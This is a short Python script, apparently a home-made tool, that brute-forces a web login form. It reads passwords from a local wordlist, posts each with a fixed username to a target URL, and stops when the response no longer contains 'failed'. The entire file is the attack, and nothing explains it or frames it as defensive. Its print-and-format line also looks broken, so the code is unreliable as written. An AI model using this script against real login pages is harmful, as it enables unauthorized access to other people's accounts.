#!/usr/bin/env python
import requests

username = ""
target_url = ""
data = {"username": username,"password": "","Login": "submit"}

with open("/home/goldmund/Downloads/original.txt", "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data=data)
        if ("failed" not in response.content):
            print("[+] Password found --> {i}").format(i=word)
            exit()

print("[+] End of line.")

